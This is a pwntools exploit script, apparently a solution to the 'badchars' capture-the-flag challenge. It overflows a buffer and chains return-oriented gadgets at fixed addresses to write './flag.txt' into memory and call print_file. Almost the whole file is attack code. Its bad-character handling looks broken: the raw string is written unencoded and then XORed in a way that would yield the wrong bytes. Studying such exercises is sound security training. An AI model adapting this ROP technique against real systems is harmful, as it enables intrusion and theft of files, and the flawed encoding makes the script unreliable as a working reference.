from pwn import *

def write(dest, data):
    d = b''
    d += p64(0x000000000040069c) 
    d += p64(data) # r12
    d += p64(dest) # r13
    d += p64(data) # r14
    d += p64(dest) # r15
    d += p64(0x0000000000400634) # mov qword ptr [r13], r12; ret; 

    return d

# a byte at a time
def write_enc(dest, data):
    d = b''
    d += p64(0x000000000040069c) 
    d += p64(data) # r12
    d += p64(dest) # r13
    d += p64(data) # r14
    d += p64(dest) # r15
    d += p64(0x0000000000400628) # xor byte ptr [r15], r14b; ret; 
    return d

# I know this is too ugly
def isbad(c):
    bad = ['a', 'x', 'g','.']
    ret = []
    for b in bad:
        if b in c:
            ret.append(b)
    return ret

def fix(pos, c):
    p = b''
    p += write_enc(pos, ord(c)^0xeb)
    return p

data = './flag.txt'
'''     (.)/fl(ag.)txt'''
p = b'A'*40

start = 0x601030


# Write the whole flag
for i in range(0, len(data), 4):
    d = data[i:i+4].ljust(4, '\x00')
    badc = isbad(d)
    p += write(start+i, int.from_bytes(d.encode(), byteorder='little'))

# fix bad bytes with xor
for i in range(0, len(data)):
    d = data[i]
    badc = isbad([d])
    if len(badc) > 0:
        p += fix(start+i, d)

# setup call to printfile
p += p64(0x00000000004006a3) # 0x00000000004006a3: pop rdi; ret; 
p += p64(start)
p += p64(0x400510) # print_file 

print(f'payload size: {len(p)}, max is {512-40}')

def run(p):
    io = process('./badchars')
    #io = gdb.debug('./badchars', 
    #'''b pwnme
    #    b *(pwnme+0x105)
    #    c
    #    c
    #    ni''')
    io.sendline(p)
    io.interactive()

run(p)
